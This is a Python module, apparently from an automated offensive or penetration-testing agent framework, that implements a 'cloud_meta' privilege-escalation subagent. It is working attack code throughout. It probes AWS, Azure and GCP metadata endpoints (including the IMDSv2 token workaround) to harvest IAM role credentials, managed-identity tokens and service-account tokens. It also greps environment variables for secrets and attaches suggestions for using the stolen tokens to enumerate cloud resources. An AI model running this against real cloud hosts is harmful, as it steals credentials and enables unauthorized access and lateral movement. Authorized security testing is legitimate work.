"""
cloud_meta_subagent.py — Cloud metadata service and SSRF exploitation.

AGENT_NAME  : "privesc"
SUBAGENT_NAME: "cloud_meta"

Methodology:
  1. Detect cloud provider (AWS, Azure, GCP, DigitalOcean, Oracle Cloud)
  2. Query IMDSv1 / IMDSv2 (AWS), IMDS (Azure/GCP) for credentials
  3. Extract IAM role credentials (AWS), MSI tokens (Azure), service account tokens (GCP)
  4. Enumerate permissions on harvested credentials (sts:GetCallerIdentity, az account, gcloud)
  5. Check for IMDSv2 enforcement (hop limit, token requirement)
  6. SSRF probing for internal metadata endpoints
  7. Store all harvested credentials as CRITICAL findings
"""

from __future__ import annotations

import json
import logging
import re
from typing import Any

from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Metadata endpoints
# ---------------------------------------------------------------------------

AWS_IMDSV1_BASE = "http://169.254.169.254/latest/meta-data"
AWS_IMDSV2_TOKEN_URL = "http://169.254.169.254/latest/api/token"
AZURE_IMDS_BASE = "http://169.254.169.254/metadata/instance"
GCP_METADATA_BASE = "http://metadata.google.internal/computeMetadata/v1"
DO_METADATA_BASE = "http://169.254.169.254/metadata"

# ---------------------------------------------------------------------------
# Detection patterns
# ---------------------------------------------------------------------------

_AWS_CRED_RE = re.compile(
    r"(AccessKeyId|SecretAccessKey|Token|Expiration)\s*[\":\s]+([A-Za-z0-9+/=\-]{10,})",
    re.IGNORECASE,
)
_AZURE_TOKEN_RE = re.compile(r"access_token\s*[\":\s]+([A-Za-z0-9\-_.]+)", re.IGNORECASE)
_GCP_TOKEN_RE = re.compile(r"access_token\s*[\":\s]+ya29\.[A-Za-z0-9\-_]+", re.IGNORECASE)
_IAM_ROLE_RE = re.compile(r"arn:aws:iam::\d+:(?:role|assumed-role)/(\S+)", re.IGNORECASE)
_ACCOUNT_ID_RE = re.compile(r'"Account"\s*:\s*"(\d{12})"', re.IGNORECASE)
_IMDSV2_BLOCKED_RE = re.compile(r"(401|405|Unauthorized|IMDSv2.*required)", re.IGNORECASE)


class CloudMetaSubagent(BaseSubagent):
    """Query cloud instance metadata services for IAM credentials and environment info."""

    AGENT_NAME: str = "privesc"
    SUBAGENT_NAME: str = "cloud_meta"

    async def run(self, target: str, cloud: str = "auto", **kwargs: Any) -> SubagentResult:
        """
        Query cloud metadata endpoints to harvest credentials.

        Parameters
        ----------
        target:
            Instance IP (or 127.0.0.1 if running on the cloud host directly).
        cloud:
            ``"aws"``, ``"azure"``, ``"gcp"``, ``"auto"`` (detect automatically).

        Returns
        -------
        SubagentResult
        """
        result = SubagentResult(
            session_id=self.session_id,
            subagent_name=self.SUBAGENT_NAME,
            target=target,
        )

        # ── 1. Cloud provider detection ───────────────────────────────────
        detected_cloud = cloud.lower()
        if detected_cloud == "auto":
            probe_output = await self.collect_tool(
                "curl",
                target,
                {"options": (
                    "-s --connect-timeout 3 "
                    f"{AWS_IMDSV1_BASE}/ 2>&1; "
                    f"curl -s --connect-timeout 3 -H 'Metadata: true' {AZURE_IMDS_BASE}?api-version=2021-02-01 2>&1; "
                    f"curl -s --connect-timeout 3 -H 'Metadata-Flavor: Google' {GCP_METADATA_BASE}/ 2>&1"
                )},
            )

            if "ami-id" in probe_output or "instance-id" in probe_output or "AccessKeyId" in probe_output:
                detected_cloud = "aws"
            elif "azEnvironment" in probe_output or "subscriptionId" in probe_output:
                detected_cloud = "azure"
            elif "project" in probe_output.lower() and "google" in probe_output.lower():
                detected_cloud = "gcp"
            else:
                detected_cloud = "unknown"

            await self.store_finding(Finding(
                title=f"Cloud Metadata: Provider Detected — {detected_cloud.upper() if detected_cloud != 'unknown' else 'None/Not a Cloud Instance'}",
                description=(
                    f"Auto-detection identified cloud provider: {detected_cloud}. "
                    "Proceeding with provider-specific credential extraction."
                ),
                severity="INFO",
                evidence=probe_output[:500],
                tool="curl",
                host=target,
                mitre_technique="T1552.005",
            ))

        # ── 2. AWS IMDS credential extraction ────────────────────────────
        if detected_cloud in ("aws", "auto"):
            await self._query_aws(target)

        # ── 3. Azure IMDS credential extraction ──────────────────────────
        if detected_cloud in ("azure", "auto"):
            await self._query_azure(target)

        # ── 4. GCP metadata credential extraction ────────────────────────
        if detected_cloud in ("gcp", "auto"):
            await self._query_gcp(target)

        # ── 5. Environment variable credential scan ───────────────────────
        env_output = await self.collect_tool(
            "bash",
            target,
            {"options": (
                "-c \"env 2>/dev/null | grep -iE "
                "'(AWS_|AZURE_|GOOGLE_|SECRET|TOKEN|KEY|PASSWORD|CREDENTIAL|API_KEY)' 2>/dev/null\""
            )},
        )

        env_creds = [l for l in env_output.splitlines()
                     if re.search(r"(SECRET|TOKEN|PASSWORD|KEY|CREDENTIAL)", l, re.IGNORECASE)
                     and "=" in l]
        if env_creds:
            await self.store_finding(Finding(
                title=f"Cloud Credentials: {len(env_creds)} Credential(s) in Environment Variables",
                description=(
                    f"{len(env_creds)} environment variable(s) containing credentials were found. "
                    "These may include cloud provider keys, API tokens, or database passwords "
                    "that can be used for lateral movement or privilege escalation."
                ),
                severity="HIGH",
                evidence="\n".join(env_creds[:10]),
                tool="bash",
                host=target,
                mitre_technique="T1552.001",
                exploit_suggestion=(
                    "Extract AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY for AWS CLI use. "
                    "Enumerate permissions: aws sts get-caller-identity && aws iam list-attached-user-policies"
                ),
            ))

        result.findings = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result

    # ------------------------------------------------------------------
    # Provider-specific helpers
    # ------------------------------------------------------------------

    async def _query_aws(self, target: str) -> None:
        """Query AWS Instance Metadata Service for IAM credentials."""

        # Try IMDSv1 first
        role_output = await self.collect_tool(
            "curl",
            target,
            {"options": f"-s --connect-timeout 5 {AWS_IMDSV1_BASE}/iam/security-credentials/ 2>&1"},
        )

        imdsv1_blocked = bool(_IMDSV2_BLOCKED_RE.search(role_output))

        if imdsv1_blocked:
            # Try IMDSv2 with token
            token_output = await self.collect_tool(
                "curl",
                target,
                {"options": (
                    f"-s -X PUT --connect-timeout 5 "
                    f"-H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' "
                    f"{AWS_IMDSV2_TOKEN_URL} 2>&1"
                )},
            )
            imdsv2_token = token_output.strip()
            if imdsv2_token and not _IMDSV2_BLOCKED_RE.search(imdsv2_token):
                role_output = await self.collect_tool(
                    "curl",
                    target,
                    {"options": (
                        f"-s --connect-timeout 5 "
                        f"-H 'X-aws-ec2-metadata-token: {imdsv2_token}' "
                        f"{AWS_IMDSV1_BASE}/iam/security-credentials/ 2>&1"
                    )},
                )

        role_name = role_output.strip()
        if not role_name or _IMDSV2_BLOCKED_RE.search(role_name):
            await self.store_finding(Finding(
                title="AWS IMDS: No IAM Role Attached or IMDSv1 Blocked",
                description=(
                    "AWS IMDS query returned no IAM role name. "
                    "Either no IAM role is attached to this instance, "
                    "or IMDSv2 hop-limit is enforcing stricter access."
                ),
                severity="INFO",
                evidence=role_output[:300],
                tool="curl",
                host=target,
                mitre_technique="T1552.005",
            ))
            return

        # Fetch actual credentials for the role
        cred_output = await self.collect_tool(
            "curl",
            target,
            {"options": f"-s --connect-timeout 5 {AWS_IMDSV1_BASE}/iam/security-credentials/{role_name} 2>&1"},
        )

        cred_matches = _AWS_CRED_RE.findall(cred_output)
        has_creds = any(k in cred_output for k in ("AccessKeyId", "SecretAccessKey"))

        if has_creds:
            await self.store_finding(Finding(
                title=f"AWS IMDS: IAM Role Credentials Harvested — Role: {role_name}",
                description=(
                    f"AWS IMDS returned temporary IAM credentials for role '{role_name}'. "
                    "These credentials can be used with the AWS CLI to enumerate and exploit "
                    "cloud resources based on the role's permissions."
                ),
                severity="CRITICAL",
                evidence=cred_output[:1000],
                tool="curl",
                host=target,
                mitre_technique="T1552.005",
                exploit_suggestion=(
                    f"export AWS_ACCESS_KEY_ID=<key> AWS_SECRET_ACCESS_KEY=<secret> "
                    f"AWS_SESSION_TOKEN=<token>. "
                    f"Enumerate: aws sts get-caller-identity && aws iam list-attached-role-policies --role-name {role_name}"
                ),
            ))

        # Also grab account ID
        iam_output = await self.collect_tool(
            "curl",
            target,
            {"options": f"-s --connect-timeout 5 {AWS_IMDSV1_BASE}/iam/info/ 2>&1"},
        )
        account_match = _ACCOUNT_ID_RE.search(iam_output)
        role_match = _IAM_ROLE_RE.search(iam_output)
        if account_match or role_match:
            await self.store_finding(Finding(
                title=f"AWS IMDS: Account Info — Account {account_match.group(1) if account_match else 'unknown'}",
                description=(
                    f"AWS account ID: {account_match.group(1) if account_match else 'unknown'}. "
                    f"Role ARN: {role_match.group(0) if role_match else 'unknown'}. "
                    "Use account ID to enumerate cross-account trust relationships."
                ),
                severity="MEDIUM",
                evidence=iam_output[:500],
                tool="curl",
                host=target,
                mitre_technique="T1552.005",
            ))

    async def _query_azure(self, target: str) -> None:
        """Query Azure IMDS for MSI access tokens."""
        token_output = await self.collect_tool(
            "curl",
            target,
            {"options": (
                "-s --connect-timeout 5 "
                f"'{AZURE_IMDS_BASE}/../identity/oauth2/token"
                "?api-version=2018-02-01&resource=https://management.azure.com/' "
                "-H 'Metadata: true' 2>&1"
            )},
        )

        has_token = bool(_AZURE_TOKEN_RE.search(token_output))
        if has_token:
            await self.store_finding(Finding(
                title="Azure IMDS: Managed Identity Access Token Harvested",
                description=(
                    "Azure Managed Service Identity (MSI) token successfully retrieved from IMDS. "
                    "This OAuth2 bearer token grants access to Azure Resource Manager APIs "
                    "with the permissions assigned to the VM's managed identity."
                ),
                severity="CRITICAL",
                evidence=token_output[:500],
                tool="curl",
                host=target,
                mitre_technique="T1552.005",
                exploit_suggestion=(
                    "Use token: az account get-access-token (or curl with Authorization: Bearer <token>). "
                    "Enumerate: curl -H 'Authorization: Bearer <token>' "
                    "https://management.azure.com/subscriptions?api-version=2020-01-01"
                ),
            ))

        # Instance info
        instance_output = await self.collect_tool(
            "curl",
            target,
            {"options": (
                "-s --connect-timeout 5 "
                f"'{AZURE_IMDS_BASE}?api-version=2021-02-01&format=json' "
                "-H 'Metadata: true' 2>&1"
            )},
        )

        if "subscriptionId" in instance_output or "resourceGroupName" in instance_output:
            await self.store_finding(Finding(
                title="Azure IMDS: Instance Metadata Retrieved",
                description="Azure IMDS returned instance metadata including subscription ID, "
                            "resource group, VM name, and location. "
                            "Use to enumerate adjacent Azure resources.",
                severity="MEDIUM",
                evidence=instance_output[:800],
                tool="curl",
                host=target,
                mitre_technique="T1552.005",
            ))

    async def _query_gcp(self, target: str) -> None:
        """Query GCP metadata server for service account tokens."""
        sa_output = await self.collect_tool(
            "curl",
            target,
            {"options": (
                "-s --connect-timeout 5 "
                f"{GCP_METADATA_BASE}/instance/service-accounts/ "
                "-H 'Metadata-Flavor: Google' 2>&1"
            )},
        )

        token_output = await self.collect_tool(
            "curl",
            target,
            {"options": (
                "-s --connect-timeout 5 "
                f"{GCP_METADATA_BASE}/instance/service-accounts/default/token "
                "-H 'Metadata-Flavor: Google' 2>&1"
            )},
        )

        has_token = bool(_GCP_TOKEN_RE.search(token_output))
        if has_token:
            await self.store_finding(Finding(
                title="GCP Metadata: Service Account OAuth2 Token Harvested",
                description=(
                    "GCP instance metadata service returned an OAuth2 access token "
                    "for the default service account. This token grants access to GCP APIs "
                    "with the permissions of the attached service account."
                ),
                severity="CRITICAL",
                evidence=token_output[:500],
                tool="curl",
                host=target,
                mitre_technique="T1552.005",
                exploit_suggestion=(
                    "Use token: curl -H 'Authorization: Bearer <token>' "
                    "https://cloudresourcemanager.googleapis.com/v1/projects. "
                    "Enumerate: gcloud auth activate-service-account --key-file=<token>"
                ),
            ))

        project_output = await self.collect_tool(
            "curl",
            target,
            {"options": (
                "-s --connect-timeout 5 "
                f"{GCP_METADATA_BASE}/project/project-id "
                "-H 'Metadata-Flavor: Google' 2>&1"
            )},
        )

        if project_output and not re.search(r"(error|refused|timed out)", project_output, re.IGNORECASE):
            await self.store_finding(Finding(
                title=f"GCP Metadata: Project ID Retrieved — {project_output.strip()[:50]}",
                description=(
                    f"GCP metadata server accessible. Project ID: {project_output.strip()[:100]}. "
                    "Use to enumerate GCP resources in this project."
                ),
                severity="MEDIUM",
                evidence=f"Project: {project_output.strip()}\nSA: {sa_output.strip()[:200]}",
                tool="curl",
                host=target,
                mitre_technique="T1552.005",
            ))
